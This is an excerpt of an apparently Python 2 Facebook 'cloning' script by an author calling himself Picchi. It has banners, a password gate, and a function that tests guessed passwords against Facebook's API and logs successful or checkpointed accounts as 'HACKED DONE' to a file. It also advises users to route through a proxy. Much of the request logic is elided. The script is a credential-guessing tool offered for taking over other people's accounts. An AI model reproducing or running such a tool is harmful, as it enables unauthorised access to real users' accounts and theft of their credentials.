...
\033[1;91m          _             ____       
\033[1;91m         | |           |___ \      
\033[1;92m      ___| | ___  _ __   __) |_ __
\033[1;92m     / __| |/ _ \| '_ \ |__ <| '__| Version 1.0
\033[1;93m    | (__| | (_) | | | |___) | |   
\033[1;93m     \___|_|\___/|_| |_|____/|_|   
\033[1;93m🔥╭╬──────────────────────────────────╬╮🔥
\033[0;97m  ⚡ ✯ 𝕮𝖗𝖊𝖆𝖙𝖔𝖗  👉 𝕻𝖎𝖈𝖈𝖍𝖎   ✬⚡
\033[0;97m  ⚡ ✯ 𝕱𝖆𝖈𝖊𝖇𝖔𝖔𝖐 👉 𝕻𝖎𝖈𝖈𝖍𝖎 𝕷𝖊𝖐𝖍𝖔𝖐 ✬⚡
...
\033[1;32m  ノ )   Lﾉ
\033[1;32m  (_／"""
jalan("\033[1;91m•◈•────────────•◈•\033[1;99m𝕻𝖎𝖈𝖈𝖍𝖎\033[1;99m•◈•────────────•◈•")                                      
jalan("\033[1;91m  ___ _    __   __  _  ___  ___ ")  
jalan("\033[1;91m / _/| |  /__\ |  \| || __|| _ \ CLONE ALL COUNTRY")
jalan("\033[1;32m| \__| |_| \/ || | ' || _| | v / ") 
jalan("\033[1;32m \__/|___|\__/ |_|\__||___||_|_\ ") 
jalan("\033[1;32m BANGLADESHI & WIFI USER USE ANY PROXY TO CLONE")
jalan("\033[1;93m 🔥 🅆🄴🄻🄻🄲🄾🄼🄴 🅃🄾 🄿🄸🄲🄲🄷🄸 🄲🅁🄰🄲🄺🄸🄽🄶 🅆🄾🅁🄻🄳 🔥 ")
jalan("\033[1;96m•◈•──────────•◈•\033[1;96m𝕻𝖎𝖈𝖈𝖍𝖎 𝕷𝖊𝖐𝖍𝖔𝖐\033[1;96m•◈•──────────•◈•")
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Picchi
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;96mWrong Password"
            os.system('xdg-open https://www.facebook.com/Romantic.Picchi33')
    else:
...
def pilih_super():
									...
									if 'access_token' in q:
										...
										if 'www.facebook.com' in q["error_msg"]:
											...
											if 'access_token' in q:
												...
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;36;40m[HACKED DONE😂] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass5 + ' ⚡ ' + b['name']
													cek = open("out/CP.txt", "a")
	...
	print '\033[1;34;40m[+] CP File Has Been Saved : save/picchi.txt'
	print """
\033[1;31;40m ●════════════════════════◄►════════════════════════●
           """
